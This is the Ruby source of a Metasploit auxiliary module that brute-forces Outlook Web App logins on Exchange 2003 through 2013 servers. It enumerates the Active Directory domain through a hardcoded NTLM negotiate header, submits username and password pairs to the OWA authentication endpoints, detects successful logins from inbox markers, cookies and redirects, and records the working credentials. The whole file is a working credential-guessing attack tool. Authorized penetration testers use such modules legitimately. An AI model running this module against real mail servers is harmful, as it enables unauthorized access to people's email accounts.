##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/proto/ntlm/message'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'           => 'Outlook Web App (OWA) Brute Force Utility',
      'Description'    => %q{
        This module tests credentials on OWA 2003, 2007, 2010, 2013 servers. The default
        action is set to OWA 2010.
      },
      'Author'         =>
        [
          'Vitor Moreira',
          'Spencer McIntyre',
          'SecureState R&D Team',
          'sinn3r',
          'Brandon Knight',
          'Pete (Bokojan) Arzamendi, #Outlook 2013 updates'
        ],
      'License'        => MSF_LICENSE,
      'Actions'        =>
        [
          [
            'OWA_2003',
            {
              'Description' => 'OWA version 2003',
              'AuthPath'    => '/exchweb/bin/auth/owaauth.dll',
              'InboxPath'   => '/exchange/',
              'InboxCheck'  => /Inbox/
            }
          ],
          [
            'OWA_2007',
            {
              'Description' => 'OWA version 2007',
              'AuthPath'    => '/owa/auth/owaauth.dll',
              'InboxPath'   => '/owa/',
              'InboxCheck'  => /addrbook.gif/
            }
          ],
          [
            'OWA_2010',
            {
              'Description' => 'OWA version 2010',
              'AuthPath'    => '/owa/auth.owa',
              'InboxPath'   => '/owa/',
              'InboxCheck'  => /Inbox|location(\x20*)=(\x20*)"\\\/(\w+)\\\/logoff\.owa|A mailbox couldn\'t be found|\<a .+onclick="return JumpTo\('logoff\.aspx.+\">/
            }
          ],
          [
            'OWA_2013',
            {
              'Description' => 'OWA version 2013',
              'AuthPath'    => '/owa/auth.owa',
              'InboxPath'   => '/owa/',
              'InboxCheck'  => /Inbox|logoff\.owa/
            }
          ]
        ],
      'DefaultAction' => 'OWA_2010',
      'DefaultOptions' => {
        'SSL' => true
      }
    )


    register_options(
      [
        OptInt.new('RPORT', [ true, "The target port", 443]),
        OptAddress.new('RHOST', [ true, "The target address", true]),
        OptBool.new('ENUM_DOMAIN', [ true, "Automatically enumerate AD domain using NTLM authentication", true]),
      ], self.class)


    register_advanced_options(
      [
        OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", ''])
      ], self.class)

    deregister_options('BLANK_PASSWORDS', 'RHOSTS','PASSWORD','USERNAME')
  end

  def run

    vhost = datastore['VHOST'] || datastore['RHOST']

    print_status("#{msg} Testing version #{action.name}")

    # Here's a weird hack to check if each_user_pass is empty or not
    # apparently you cannot do each_user_pass.empty? or even inspect() it
    isempty = true
    each_user_pass do |user|
      isempty = false
      break
    end
    print_error("No username/password specified") if isempty

    auth_path   = action.opts['AuthPath']
    inbox_path  = action.opts['InboxPath']
    login_check = action.opts['InboxCheck']

    domain = nil

    if datastore['AD_DOMAIN'] and not datastore['AD_DOMAIN'].empty?
      domain = datastore['AD_DOMAIN']
    end

    if ((datastore['AD_DOMAIN'].nil? or datastore['AD_DOMAIN'] == '') and datastore['ENUM_DOMAIN'])
      domain = get_ad_domain
    end

    begin
      each_user_pass do |user, pass|
        next if (user.blank? or pass.blank?)
        vprint_status("#{msg} Trying #{user} : #{pass}")
        try_user_pass({"user" => user, "domain"=>domain, "pass"=>pass, "auth_path"=>auth_path, "inbox_path"=>inbox_path, "login_check"=>login_check, "vhost"=>vhost})
      end
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
      print_error("#{msg} HTTP Connection Error, Aborting")
    end
  end

  def try_user_pass(opts)
    user = opts["user"]
    pass = opts["pass"]
    auth_path = opts["auth_path"]
    inbox_path = opts["inbox_path"]
    login_check = opts["login_check"]
    vhost = opts["vhost"]
    domain = opts["domain"]

    user = domain + '\\' + user if domain

    headers = {
      'Cookie' => 'PBack=0'
    }

    if (datastore['SSL'].to_s.match(/^(t|y|1)/i))
      if action.name == "OWA_2013"
        data = 'destination=https://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1'
      else
        data = 'destination=https://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
      end
    else
      if action.name == "OWA_2013"
        data = 'destination=http://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1'
      else
        data = 'destination=http://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
      end
    end

    begin
      res = send_request_cgi({
        'encode'   => true,
        'uri'      => auth_path,
        'method'   => 'POST',
        'headers'  => headers,
        'data'     => data
      })

    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("#{msg} HTTP Connection Failed, Aborting")
      return :abort
    end

    if not res
      print_error("#{msg} HTTP Connection Error, Aborting")
      return :abort
    end

    if action.name != "OWA_2013" and res.get_cookies.empty?
        print_error("#{msg} Received invalid repsonse due to a missing cookie (possibly due to invalid version), aborting")
        return :abort
    end
    if action.name == "OWA_2013"
      #Check for a response code to make sure login was valid. Changes from 2010 to 2013.
      #Check if the password needs to be changed.
      if res.headers['location'] =~ /expiredpassword/
        print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}': NOTE password change required")
        report_hash = {
          :host   => datastore['RHOST'],
          :port   => datastore['RPORT'],
          :sname  => 'owa',
          :user   => user,
          :pass   => pass,
          :active => true,
          :type => 'password'}

        report_auth_info(report_hash)
        return :next_user
      end

      #No password change required moving on.
      reason = res.headers['location'].split('reason=')[1]
      if reason == nil
        headers['Cookie'] = 'PBack=0;' << res.get_cookies
      else
      #Login didn't work. no point on going on.
        vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
        return :Skip_pass
      end
    else
       # these two lines are the authentication info
      cookies = res.get_cookies
      sessionid = 'sessionid=' << cookies.split('sessionid=')[1].split('; ')[0]
      cadata = 'cadata=' << cookies.split('cadata=')[1].split('; ')[0]
      headers['Cookie'] = 'PBack=0; ' << sessionid << '; ' << cadata
    end

    begin
      res = send_request_cgi({
        'uri'       => inbox_path,
        'method'    => 'GET',
        'headers'   => headers
      }, 20)
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("#{msg} HTTP Connection Failed, Aborting")
      return :abort
    end

    if not res
      print_error("#{msg} HTTP Connection Error, Aborting")
      return :abort
    end

    if res.code == 302
      vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
      return :skip_pass
    end

    if res.body =~ login_check
      print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")

      report_hash = {
        :host   => datastore['RHOST'],
        :port   => datastore['RPORT'],
        :sname  => 'owa',
        :user   => user,
        :pass   => pass,
        :active => true,
        :type => 'password'}

      report_auth_info(report_hash)
      return :next_user
    else
      vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
      return :skip_pass
    end
  end

  def get_ad_domain
    urls = ["aspnet_client",
      "Autodiscover",
      "ecp",
      "EWS",
      "Microsoft-Server-ActiveSync",
      "OAB",
      "PowerShell",
      "Rpc"]

    domain = nil

    urls.each do |url|
      begin
        res = send_request_cgi({
          'encode'   => true,
          'uri'      => "/#{url}",
          'method'   => 'GET',
          'headers'  =>  {"Authorization" => "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
        })
      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
        vprint_error("#{msg} HTTP Connection Failed")
        next
      end

      if not res
        vprint_error("#{msg} HTTP Connection Timeout")
        next
      end

      if res and res.code == 401 and res['WWW-Authenticate'].match(/^NTLM/i)
        hash = res['WWW-Authenticate'].split('NTLM ')[1]
        domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
        print_good("Found target domain: " + domain)
        return domain
      end
    end

    return domain
  end

  def msg
    "#{vhost}:#{rport} OWA -"
  end

end

